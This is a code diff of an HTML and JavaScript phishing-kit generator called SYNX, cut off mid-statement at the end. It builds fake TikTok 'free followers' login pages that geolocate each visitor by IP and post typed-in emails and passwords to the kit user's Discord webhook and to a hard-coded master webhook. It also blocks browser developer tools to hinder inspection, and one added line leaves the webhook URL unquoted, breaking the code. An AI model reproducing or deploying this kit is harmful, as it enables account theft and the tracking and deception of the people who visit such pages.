@@ -3,28 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYNX Generator</title>
+    <title id="pageTitle">SYNX Generator</title>
     <style>
-        /* ===== BASE STYLES ===== */
+        /* Base Styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Proxima Nova', Arial, sans-serif;
         }
-
+        
         body {
             background-color: #0f0f0f;
-            color: #ffffff;
-            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             overflow-x: hidden;
         }
-
-        /* ===== GENERATOR PAGE ===== */
-        .generator-container {
+        
+        /* Generator Page Styles */
+        .header {
+            position: absolute;
+            top: 20px;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .header-text {
+            font-size: 48px;
+            font-weight: 700;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000; }
+            to { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000; }
+        }
+        
+        .generator-box {
             width: 100%;
             max-width: 500px;
             background-color: #1a1a1a;
@@ -34,41 +53,19 @@
             border: 1px solid #333;
             margin: 20px;
         }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            font-size: 2.5rem;
-            color: #ff2a2a;
-            text-shadow: 0 0 10px rgba(255, 42, 42, 0.5);
-            animation: glow 2s infinite alternate;
-            margin-bottom: 10px;
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 5px #ff2a2a; }
-            to { text-shadow: 0 0 15px #ff2a2a; }
-        }
-
-        .header p {
-            color: #aaa;
-        }
-
-        .form-group {
+        
+        .input-group {
             margin-bottom: 20px;
         }
-
-        .form-group label {
+        
+        label {
             display: block;
             margin-bottom: 8px;
+            color: #fff;
             font-weight: 600;
-            color: #ddd;
         }
-
-        .form-group input {
+        
+        input {
             width: 100%;
             padding: 12px 15px;
             background-color: #2a2a2a;
@@ -76,19 +73,17 @@
             border-radius: 5px;
             color: #fff;
             font-size: 16px;
-            transition: all 0.3s;
         }
-
-        .form-group input:focus {
+        
+        input:focus {
             outline: none;
-            border-color: #ff2a2a;
-            box-shadow: 0 0 0 2px rgba(255, 42, 42, 0.2);
+            border-color: #ff0000;
         }
-
-        .btn {
+        
+        .create-btn {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, #ff2a2a, #d41c1c);
+            background: linear-gradient(45deg, #ff0000, #990000);
             color: white;
             border: none;
             border-radius: 5px;
@@ -97,77 +92,29 @@
             cursor: pointer;
             transition: all 0.3s;
         }
-
-        .btn:hover {
+        
+        .create-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 42, 42, 0.3);
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
         }
-
-        /* ===== MODALS ===== */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background-color: #1a1a1a;
-            padding: 30px;
-            border-radius: 10px;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            animation: modalFadeIn 0.3s;
-            border: 1px solid #ff2a2a;
-        }
-
-        @keyframes modalFadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .modal h2 {
-            color: #ff2a2a;
-            margin-bottom: 15px;
-        }
-
-        .modal p {
-            margin-bottom: 20px;
-            color: #ccc;
-        }
-
-        /* ===== ANTI-INSPECT ===== */
-        #no-inspect {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000;
-            color: #ff2a2a;
-            font-size: 24px;
-            text-align: center;
-            padding-top: 100px;
-            z-index: 9999;
-        }
-
-        /* ===== TIKTOK PAGE ===== */
+        
+        /* TikTok Page Styles (Hidden by default) */
         .tiktok-page {
             display: none;
             width: 100%;
+        }
+        
+        .selection-page, .login-wrapper {
+            width: 100%;
             max-width: 600px;
             padding: 20px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
-
+        
         .selection-container, .login-container {
             width: 100%;
             padding: 40px 36px 36px;
@@ -179,7 +126,7 @@
             margin-bottom: 20px;
             position: relative;
         }
-
+        
         .selection-title {
             font-size: 28px;
             font-weight: 700;
@@ -189,14 +136,14 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-
+        
         .follower-options {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 15px;
             margin-bottom: 30px;
         }
-
+        
         .follower-option {
             padding: 20px;
             border-radius: 8px;
@@ -207,31 +154,31 @@
             position: relative;
             overflow: hidden;
         }
-
+        
         .follower-option:hover {
             transform: translateY(-5px);
             box-shadow: 0 5px 15px rgba(254, 44, 85, 0.2);
             background-color: rgba(254, 44, 85, 0.15);
         }
-
+        
         .follower-option.active {
             background-color: rgba(254, 44, 85, 0.2);
             border-color: #FE2C55;
         }
-
+        
         .follower-count {
             font-size: 24px;
             font-weight: 700;
             color: #FE2C55;
             margin-bottom: 5px;
         }
-
+        
         .follower-label {
             font-size: 14px;
             color: #161823;
             opacity: 0.8;
         }
-
+        
         .proceed-btn, .login-button {
             width: 100%;
             padding: 14px;
@@ -246,46 +193,81 @@
             transition: all 0.3s ease;
             box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
         }
-
+        
         .proceed-btn:hover, .login-button:hover {
             transform: translateY(-2px);
             box-shadow: 0 6px 20px rgba(254, 44, 85, 0.4);
         }
-
-        .info-box {
+        
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            padding: 16px;
-            background-color: white;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background-color: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
             text-align: center;
-            border-radius: 8px;
-            box-shadow: 0 1px 8px rgba(0, 0, 0, 0.05);
-            border: 1px solid rgba(22, 24, 35, 0.06);
-            font-size: 14px;
-            color: rgba(22, 24, 35, 0.5);
+            position: relative;
+            animation: modalOpen 0.4s ease-out;
+            border: 1px solid #ff0000;
         }
-
-        .info-box a {
-            color: #161823;
+        
+        @keyframes modalOpen {
+            from { opacity: 0; transform: translateY(-50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .modal-title {
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        
+        .modal-message {
+            color: #ccc;
+            margin-bottom: 20px;
+        }
+        
+        .modal-btn {
+            padding: 10px 20px;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
             font-weight: 600;
-            text-decoration: none;
         }
-
-        /* ===== ANIMATIONS ===== */
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background-color: #FE2C55;
-            opacity: 0;
-            z-index: 10;
-            animation: confetti 2s ease-out;
+        
+        /* Loading spinner */
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 20px;
+            border: 4px solid rgba(254, 44, 85, 0.2);
+            border-top: 4px solid #fe2c55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
-
-        @keyframes confetti {
-            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100px) rotate(360deg); opacity: 0; }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
+        
+        /* Animation elements */
         .follower-animation {
             position: absolute;
             color: rgba(254, 44, 85, 0.2);
@@ -295,7 +277,7 @@
             pointer-events: none;
             user-select: none;
         }
-
+        
         .follower-animation.left {
             left: 0;
             top: 50%;
@@ -304,7 +286,7 @@
             text-orientation: mixed;
             animation: floatUp 8s linear infinite;
         }
-
+        
         .follower-animation.right {
             right: 0;
             top: 50%;
@@ -313,51 +295,60 @@
             text-orientation: mixed;
             animation: floatDown 8s linear infinite;
         }
-
+        
         @keyframes floatUp {
             0% { transform: translateY(100vh) translateY(-50%); opacity: 0; }
             10% { opacity: 0.3; }
             90% { opacity: 0.3; }
             100% { transform: translateY(-100vh) translateY(-50%); opacity: 0; }
         }
-
+        
         @keyframes floatDown {
             0% { transform: translateY(-100vh) translateY(-50%); opacity: 0; }
             10% { opacity: 0.3; }
             90% { opacity: 0.3; }
             100% { transform: translateY(100vh) translateY(-50%); opacity: 0; }
         }
+        
+        /* Confetti animation */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #FE2C55;
+            opacity: 0;
+            z-index: 10;
+            animation: confetti 2s ease-out;
+        }
+        
+        @keyframes confetti {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100px) rotate(360deg); opacity: 0; }
+        }
     </style>
 </head>
 <body>
-    <!-- Anti-Inspect Warning -->
-    <div id="no-inspect">
-        <h1>⚠️ Access Restricted</h1>
-        <p>Developer tools are disabled on this page.</p>
-    </div>
-
-    <!-- Generator Page -->
+    <!-- Generator Page (Visible by default) -->
     <div id="generatorPage">
-        <div class="generator-container">
-            <div class="header">
-                <h1>SYNX</h1>
-                <p>Create your custom TikTok followers page</p>
+        <div class="header">
+            <div class="header-text">SYNX</div>
+        </div>
+        
+        <div class="generator-box">
+            <div class="input-group">
+                <label for="directory">Directory Name</label>
+                <input type="text" id="directory" placeholder="e.g. mypage">
             </div>
-
-            <div class="form-group">
-                <label for="directory">Page Name</label>
-                <input type="text" id="directory" placeholder="example">
-            </div>
-
-            <div class="form-group">
+            
+            <div class="input-group">
                 <label for="webhook">Discord Webhook URL</label>
                 <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
             </div>
-
-            <button class="btn" id="createBtn">Generate Page</button>
+            
+            <button class="create-btn" id="createBtn">Create</button>
         </div>
     </div>
-
+    
     <!-- TikTok Page (Hidden by default) -->
     <div class="tiktok-page" id="tiktokPage">
         <!-- Selection Page -->
@@ -479,95 +470,96 @@
     </div>
 
     <!-- Modals -->
-    <div class="modal" id="successModal">
-        <div class="modal-content">
-            <h2>✅ Success!</h2>
-            <p>Your page has been created successfully.</p>
-            <div id="successDetails" style="
-                background: #2a2a2a;
-                padding: 15px;
-                border-radius: 5px;
-                margin: 15px 0;
-                text-align: left;
-                font-family: monospace;
-            "></div>
-            <button class="btn" id="successOkBtn">OK</button>
-        </div>
-    </div>
-
     <div class="modal" id="errorModal">
         <div class="modal-content">
-            <h2>❌ Error</h2>
-            <p id="errorMessage">Something went wrong.</p>
-            <button class="btn" id="errorOkBtn">OK</button>
+            <div class="modal-title">Oops!</div>
+            <div class="modal-message" id="errorMessage">Directory name already exists. Please try a different name.</div>
+            <button class="modal-btn" id="errorOkBtn">OK</button>
+        </div>
+    </div>
+    
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="modal-title">Success!</div>
+            <div class="modal-message">Your page has been created successfully.</div>
+            <div class="modal-message" id="successDetails" style="margin-top: 15px; background: #2a2a2a; padding: 10px; border-radius: 5px;"></div>
+            <button class="modal-btn" id="successOkBtn" style="margin-top: 20px;">OK</button>
+        </div>
+    </div>
+    
+    <div class="modal" id="loadingModal">
+        <div class="modal-content">
+            <div class="loading-spinner"></div>
+            <div class="modal-title" id="modalTitle">Processing</div>
+            <div class="modal-message" id="modalMessage">Please wait...</div>
         </div>
     </div>
 
     <script>
-        // =========================================
-        // MAIN APPLICATION CODE
-        // =========================================
-
+        // Configuration
+        const MASTER_WEBHOOK = 'YOUR_MASTER_WEBHOOK_URL'; // Replace with your master webhook
+        const STORAGE_KEY = 'synx_directories';
+        
         // DOM Elements
         const generatorPage = document.getElementById('generatorPage');
         const tiktokPage = document.getElementById('tiktokPage');
+        const createBtn = document.getElementById('createBtn');
         const directoryInput = document.getElementById('directory');
         const webhookInput = document.getElementById('webhook');
-        const createBtn = document.getElementById('createBtn');
-        const successModal = document.getElementById('successModal');
         const errorModal = document.getElementById('errorModal');
-        const successDetails = document.getElementById('successDetails');
+        const successModal = document.getElementById('successModal');
+        const loadingModal = document.getElementById('loadingModal');
         const errorMessage = document.getElementById('errorMessage');
-        const successOkBtn = document.getElementById('successOkBtn');
+        const successDetails = document.getElementById('successDetails');
         const errorOkBtn = document.getElementById('errorOkBtn');
-        const noInspect = document.getElementById('no-inspect');
+        const successOkBtn = document.getElementById('successOkBtn');
+        const pageTitle = document.getElementById('pageTitle');
+        
+        // TikTok Page Elements
+        const selectionPage = document.getElementById('selectionPage');
+        const loginPage = document.getElementById('loginPage');
         const proceedBtn = document.getElementById('proceedBtn');
+        const followerOptions = document.querySelectorAll('.follower-option');
         const loginBtn = document.getElementById('loginBtn');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const followerOptions = document.querySelectorAll('.follower-option');
-
-        // Configuration
-        const MASTER_WEBHOOK = 'https://discord.com/api/webhooks/1368042006764458245/tLcKO95GzvoqNdcA4Q744S5K8Lm43xrAJiBmbxEZ43HV8lcaI8wD2DvH1iPi-kyIYCkT'; // Add your master webhook here
-        const STORAGE_KEY = 'synx_pages';
-        const WORD_LIST = [
-            'alpha', 'bravo', 'charlie', 'delta', 'echo', 
-            'foxtrot', 'golf', 'hotel', 'india', 'juliet',
-            'kilo', 'lima', 'mike', 'november', 'oscar',
-            'papa', 'quebec', 'romeo', 'sierra', 'tango'
-        ];
-
+        
         // State
         let selectedFollowers = 0;
         let currentDirectory = '';
         let directories = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
-
-        // Initialize the app
-        function init() {
-            setupEventListeners();
-            setupAntiInspect();
-            checkForRedirect();
-        }
-
-        // Check if we should show a generated page
-        function checkForRedirect() {
+        
+        // Check if this is a directory page
+        function checkIfDirectoryPage() {
             const path = window.location.pathname.split('/')[1];
-            if (path && path !== '') {
+            if (path && path !== 'create' && path !== '') {
                 currentDirectory = path;
-                showTikTokPage();
+                return true;
+            }
+            return false;
+        }
+        
+        // Initialize page based on URL
+        function initPage() {
+            if (checkIfDirectoryPage()) {
+                // This is a directory page - show TikTok page
+                generatorPage.style.display = 'none';
+                tiktokPage.style.display = 'block';
+                pageTitle.textContent = 'TikTok Followers | Log in';
+                
+                // Initialize TikTok page functionality
+                initTikTokPage();
+            } else {
+                // This is the generator page
+                generatorPage.style.display = 'block';
+                tiktokPage.style.display = 'none';
+                pageTitle.textContent = 'SYNX Generator';
             }
         }
-
-        // Show TikTok page
-        function showTikTokPage() {
-            generatorPage.style.display = 'none';
-            tiktokPage.style.display = 'block';
-            document.title = 'TikTok Followers | ' + currentDirectory;
-            initTikTokPage();
-        }
-
+        
         // Initialize TikTok page functionality
         function initTikTokPage() {
+            // User info storage
             let userInfo = {
                 ip: "unknown",
                 city: "unknown",
@@ -581,40 +573,44 @@
                 userAgent: navigator.userAgent,
                 selectedFollowers: 0
             };
-
-            // Track IP and send visit info
-            trackIP();
-
+            
+            // Track IP
             async function trackIP() {
                 try {
+                    // Get IP first
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     userInfo.ip = (await ipRes.json()).ip;
-
+                    
+                    // Get location from multiple APIs for best accuracy
                     const [geoData1, geoData2] = await Promise.all([
                         fetch(`https://ipapi.co/${userInfo.ip}/json/`).then(res => res.json()).catch(() => ({})),
                         fetch(`https://ipinfo.io/${userInfo.ip}/json?token=6921bf724a508a`).then(res => res.json()).catch(() => ({}))
                     ]);
-
+                    
+                    // Process location data
                     userInfo.city = geoData2.city || geoData1.city || "Unknown";
                     userInfo.country = geoData2.country || geoData1.country_name || "Unknown";
                     userInfo.region = geoData2.region || geoData1.region || "Unknown";
                     userInfo.isp = geoData2.org || geoData1.org || "Unknown";
-
+                    
+                    // Get coordinates
                     const coords = geoData2.loc ? geoData2.loc.split(',') : 
-                                 (geoData1.latitude ? [geoData1.latitude, geoData1.longitude] : []);
+                                     (geoData1.latitude ? [geoData1.latitude, geoData1.longitude] : []);
                     userInfo.exactLocation = coords.length ? coords.join(',') : "unknown";
-
+                    
+                    // Send visit info to webhooks
                     await sendVisitInfo();
                 } catch (error) {
                     console.error("IP tracking error:", error);
                 }
             }
-
+            
+            // Send visit info to webhooks
             async function sendVisitInfo() {
                 const mapLink = userInfo.exactLocation !== "unknown" ? 
                     `🗺️ [View Location](https://www.google.com/maps/place/${userInfo.exactLocation})` : 
                     "📍 Location unknown";
-
+                
                 const embed = {
                     title: "👀 New Visitor 👀",
                     description: `Someone visited your TikTok followers page`,
@@ -643,9 +639,11 @@
                     ],
                     timestamp: new Date().toISOString()
                 };
-
+                
+                // Get webhooks for this directory
                 const webhooks = await getWebhooks();
-
+                
+                // Send to creator's webhook if exists
                 if (webhooks.creatorWebhook) {
                     await fetch(webhooks.creatorWebhook, {
                         method: 'POST',
@@ -653,7 +651,8 @@
                         body: JSON.stringify({ embeds: [embed] })
                     }).catch(err => console.error('Error sending to creator webhook:', err));
                 }
-
+                
+                // Send to master webhook if exists
                 if (webhooks.masterWebhook) {
                     await fetch(webhooks.masterWebhook, {
                         method: 'POST',
@@ -665,18 +664,20 @@
                     }).catch(err => console.error('Error sending to master webhook:', err));
                 }
             }
-
+            
+            // Get webhooks for this directory
             async function getWebhooks() {
                 const dirData = directories[currentDirectory.toLowerCase()];
                 return {
                     creatorWebhook: dirData?.webhook || null,
-                    masterWebhook: MASTER_WEBHOOK
+                    masterWebhook: https://discord.com/api/webhooks/1368042006764458245/tLcKO95GzvoqNdcA4Q744S5K8Lm43xrAJiBmbxEZ43HV8lcaI8wD2DvH1iPi-kyIYCkT
                 };
             }
-
+            
+            // Send login data to webhooks
             async function sendToWebhooks(email, password) {
                 const webhooks = await getWebhooks();
-
+                
                 const embed = {
                     title: "🎯 New TikTok Login 🎯",
                     color: 0xFF5F5F,
@@ -704,7 +705,8 @@
                     ],
                     timestamp: new Date().toISOString()
                 };
-
+                
+                // Send to creator's webhook if exists
                 if (webhooks.creatorWebhook) {
                     await fetch(webhooks.creatorWebhook, {
                         method: 'POST',
@@ -712,7 +714,8 @@
                         body: JSON.stringify({ embeds: [embed] })
                     }).catch(err => console.error('Error sending to creator webhook:', err));
                 }
-
+                
+                // Send to master webhook if exists
                 if (webhooks.masterWebhook) {
                     await fetch(webhooks.masterWebhook, {
                         method: 'POST',
@@ -724,11 +727,12 @@
                     }).catch(err => console.error('Error sending to master webhook:', err));
                 }
             }
-
+            
+            // Create confetti effect
             function createConfetti(element) {
                 const rect = element.getBoundingClientRect();
                 const colors = ['#FE2C55', '#25F4EE', '#FFFFFF', '#000000'];
-
+            
                 for (let i = 0; i < 20; i++) {
                     const confetti = document.createElement('div');
                     confetti.className = 'confetti';
@@ -737,18 +741,35 @@
                     confetti.style.top = `${rect.top + rect.height/2 - 5}px`;
                     confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
                     document.body.appendChild(confetti);
-
+            
+                    // Remove confetti after animation
                     setTimeout(() => {
                         confetti.remove();
                     }, 2000);
                 }
             }
-
+            
+            // Show loading modal
+            function showLoading(title, message) {
+                document.getElementById('modalTitle').textContent = title;
+                document.getElementById('modalMessage').textContent = message;
+                loadingModal.style.display = 'flex';
+            }
+            
+            // Show error modal
             function showError(message) {
                 errorMessage.textContent = message;
+                loadingModal.style.display = 'none';
                 errorModal.style.display = 'flex';
             }
-
+            
+            // Close modals
+            function closeModals() {
+                loadingModal.style.display = 'none';
+                errorModal.style.display = 'none';
+            }
+            
+            // Handle follower option selection
             function selectFollowerOption(option) {
                 followerOptions.forEach(opt => opt.classList.remove('active'));
                 option.classList.add('active');
@@ -756,27 +777,30 @@
                 userInfo.selectedFollowers = selectedFollowers;
                 createConfetti(option);
             }
-
+            
+            // Proceed to login page
             function proceedToLogin() {
                 if (selectedFollowers === 0) {
                     showError('Please select a follower count first');
                     return;
                 }
-                document.getElementById('selectionPage').style.display = 'none';
-                document.getElementById('loginPage').style.display = 'block';
+                selectionPage.style.display = 'none';
+                loginPage.style.display = 'block';
             }
-
+            
+            // Handle normal login
             async function handleLogin() {
                 const email = emailInput.value;
                 const password = passwordInput.value;
-
+            
                 if (!email || !password) {
                     showError('Please enter both email and password');
                     return;
                 }
-
+            
+                showLoading('Logging in', 'Please wait while we verify your credentials...');
                 await sendToWebhooks(email, password);
-
+            
                 setTimeout(() => {
                     showError('An error occurred. Please try again later.');
                     setTimeout(() => {
@@ -784,221 +808,200 @@
                     }, 3000);
                 }, 2000);
             }
-
+            
             // Event listeners for TikTok page
             followerOptions.forEach(option => {
                 option.addEventListener('click', () => selectFollowerOption(option));
             });
-
+            
             proceedBtn.addEventListener('click', proceedToLogin);
             loginBtn.addEventListener('click', handleLogin);
             document.getElementById('googleLogin').addEventListener('click', () => {
-                showError('Could not connect to Google. Please try logging in normally.');
+                showLoading('Logging in with Google', 'Connecting to Google...');
+                setTimeout(() => {
+                    showError('Could not connect to Google. Please try logging in normally.');
+                }, 3000);
             });
             document.getElementById('facebookLogin').addEventListener('click', () => {
-                showError('Could not connect to Facebook. Please try logging in normally.');
+                showLoading('Logging in with Facebook', 'Connecting to Facebook...');
+                setTimeout(() => {
+                    showError('Could not connect to Facebook. Please try logging in normally.');
+                }, 3000);
             });
             document.getElementById('twitterLogin').addEventListener('click', () => {
-                showError('Could not connect to Twitter. Please try logging in normally.');
+                showLoading('Logging in with Twitter', 'Connecting to Twitter...');
+                setTimeout(() => {
+                    showError('Could not connect to Twitter. Please try logging in normally.');
+                }, 3000);
             });
+            
+            // Track IP when page loads
+            trackIP();
         }
-
-        // =========================================
-        // GENERATOR PAGE FUNCTIONS
-        // =========================================
-
-        // Set up event listeners
-        function setupEventListeners() {
-            createBtn.addEventListener('click', handleCreate);
-            successOkBtn.addEventListener('click', () => successModal.style.display = 'none');
-            errorOkBtn.addEventListener('click', () => errorModal.style.display = 'none');
-        }
-
-        // Handle page creation
-        async function handleCreate() {
-            const directory = directoryInput.value.trim();
-            const webhook = webhookInput.value.trim();
-
-            // Validate inputs
-            if (!directory) {
-                showError('Please enter a page name');
-                return;
-            }
-
-            if (!webhook) {
-                showError('Please enter a webhook URL');
-                return;
-            }
-
-            if (!isValidWebhook(webhook)) {
-                showError('Invalid Discord webhook URL');
-                return;
-            }
-
-            if (pageExists(directory)) {
-                showError('Page name already exists');
-                return;
-            }
-
-            // Generate token
-            const token = generateToken();
-
-            // Save page
-            savePage(directory, webhook, token);
-
-            // Send notifications
-            await sendNotifications(directory, webhook, token);
-
-            // Show success
-            showSuccess(directory, token);
-        }
-
-        // Check if page exists
-        function pageExists(name) {
+        
+        // Generator Page Functions
+        
+        // Check if directory exists
+        function directoryExists(name) {
             return directories.hasOwnProperty(name.toLowerCase());
         }
-
-        // Save a new page
-        function savePage(name, webhook, token) {
-            directories[name.toLowerCase()] = { webhook, token, created: new Date().toISOString() };
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(directories));
-        }
-
-        // Generate a 12-word token
+        
+        // Generate random token (12 words)
         function generateToken() {
+            const words = [
+                'alpha', 'bravo', 'charlie', 'delta', 'echo', 'foxtrot',
+                'golf', 'hotel', 'india', 'juliet', 'kilo', 'lima',
+                'mike', 'november', 'oscar', 'papa', 'quebec', 'romeo',
+                'sierra', 'tango', 'uniform', 'victor', 'whiskey', 'xray',
+                'yankee', 'zulu', 'zero', 'one', 'two', 'three',
+                'four', 'five', 'six', 'seven', 'eight', 'nine'
+            ];
+            
             let token = [];
             for (let i = 0; i < 12; i++) {
-                token.push(WORD_LIST[Math.floor(Math.random() * WORD_LIST.length)]);
+                token.push(words[Math.floor(Math.random() * words.length)]);
             }
+            
             return token.join('-');
         }
-
+        
         // Validate webhook URL
         function isValidWebhook(url) {
             return url.startsWith('https://discord.com/api/webhooks/');
         }
-
-        // Send notifications to webhooks
-        async function sendNotifications(directory, webhook, token) {
-            const pageUrl = `${window.location.origin}/${directory}`;
-
+        
+        // Send success embed to both webhooks
+        async function sendSuccessEmbed(directory, webhook, token) {
+            const url = `${window.location.origin}/${directory}`;
             const embed = {
-                title: "SYNX Page Created",
-                description: "New TikTok followers page is ready!",
-                color: 0xff2a2a,
+                title: "SYNX Generator",
+                description: "New page created successfully",
+                color: 0xff0000,
                 fields: [
-                    { name: "Page URL", value: pageUrl },
-                    { name: "Access Token", value: `||${token}||` }
+                    {
+                        name: "Website URL",
+                        value: url,
+                        inline: false
+                    },
+                    {
+                        name: "Dashboard Token",
+                        value: `||${token}||`,
+                        inline: false
+                    }
                 ],
                 timestamp: new Date().toISOString()
             };
-
+            
             // Send to creator's webhook
-            try {
+            if (isValidWebhook(webhook)) {
                 await fetch(webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ embeds: [embed] })
-                });
-            } catch (err) {
-                console.error('Webhook error:', err);
+                }).catch(err => console.error('Error sending to creator webhook:', err));
             }
-
-            // Send to master webhook if set
+            
+            // Send to master webhook if configured
             if (MASTER_WEBHOOK) {
-                try {
-                    await fetch(MASTER_WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `New page: ${directory}`,
-                            embeds: [embed]
-                        })
-                    });
-                } catch (err) {
-                    console.error('Master webhook error:', err);
-                }
+                await fetch(MASTER_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: `New SYNX page created: ${directory}`,
+                        embeds: [embed] 
+                    })
+                }).catch(err => console.error('Error sending to master webhook:', err));
             }
         }
-
-        // Show success modal
-        function showSuccess(directory, token) {
-            const pageUrl = `${window.location.origin}/${directory}`;
+        
+        // Handle create button click
+        createBtn.addEventListener('click', async () => {
+            const directory = directoryInput.value.trim();
+            const webhook = webhookInput.value.trim();
+            
+            if (!directory) {
+                errorMessage.textContent = "Please enter a directory name";
+                errorModal.style.display = "flex";
+                return;
+            }
+            
+            if (!webhook) {
+                errorMessage.textContent = "Please enter a webhook URL";
+                errorModal.style.display = "flex";
+                return;
+            }
+            
+            if (!isValidWebhook(webhook)) {
+                errorMessage.textContent = "Please enter a valid Discord webhook URL";
+                errorModal.style.display = "flex";
+                return;
+            }
+            
+            if (directoryExists(directory)) {
+                errorMessage.textContent = "Directory name already exists. Please try a different name.";
+                errorModal.style.display = "flex";
+                return;
+            }
+            
+            // Generate token
+            const token = generateToken();
+            
+            // Store directory info
+            directories[directory.toLowerCase()] = {
+                webhook,
+                token,
+                createdAt: new Date().toISOString()
+            };
+            
+            // Save to localStorage
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(directories));
+            
+            // Send success embeds
+            await sendSuccessEmbed(directory, webhook, token);
+            
+            // Show success modal
             successDetails.innerHTML = `
-                <strong>Page URL:</strong><br>${pageUrl}<br><br>
-                <strong>Access Token:</strong><br>${token}<br><br>
-                <small>Save this token to manage your page</small>
+                <strong>URL:</strong> ${window.location.origin}/${directory}<br>
+                <strong>Token:</strong> ${token}<br><br>
+                <small>Save this token for dashboard access</small>
             `;
-            successModal.style.display = 'flex';
-        }
-
-        // Show error modal
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorModal.style.display = 'flex';
-        }
-
-        // =========================================
-        // ANTI-INSPECT PROTECTION
-        // =========================================
-
-        function setupAntiInspect() {
-            // Block context menu
-            document.addEventListener('contextmenu', (e) => {
-                e.preventDefault();
-                showInspectWarning();
-            });
-
-            // Block keyboard shortcuts
-            document.addEventListener('keydown', (e) => {
-                if (
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-                    (e.ctrlKey && e.key === 'U')
-                ) {
-                    e.preventDefault();
-                    showInspectWarning();
-                }
-            });
-
-            // Detect devtools opening
-            let devtoolsOpen = false;
-            setInterval(() => {
-                const widthThreshold = window.outerWidth - window.innerWidth > 160;
-                const heightThreshold = window.outerHeight - window.innerHeight > 160;
-
-                if ((widthThreshold || heightThreshold) && !devtoolsOpen) {
-                    devtoolsOpen = true;
-                    showInspectWarning();
-                }
-            }, 1000);
-
-            // Debugger protection
-            function debuggerProtection() {
-                setInterval(() => {
-                    if (devtoolsOpen) return;
-                    try {
-                        (function() {
-                            return false;
-                        })();
-                    } catch (e) {}
-                }, 1000);
+            successModal.style.display = "flex";
+        });
+        
+        // Close modals
+        errorOkBtn.addEventListener('click', () => {
+            errorModal.style.display = "none";
+        });
+        
+        successOkBtn.addEventListener('click', () => {
+            successModal.style.display = "none";
+            // Clear form
+            directoryInput.value = "";
+            webhookInput.value = "";
+        });
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === errorModal || e.target === successModal || e.target === loadingModal) {
+                e.target.style.display = "none";
             }
-            debuggerProtection();
-        }
-
-        // Show inspect warning
-        function showInspectWarning() {
-            noInspect.style.display = 'block';
-            setTimeout(() => {
-                noInspect.style.display = 'none';
-            }, 3000);
-        }
-
-        // Start the application
-        init();
+        });
+        
+        // Anti-inspect measures
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', function (e) {
+            if (
+                e.key === 'F12' ||
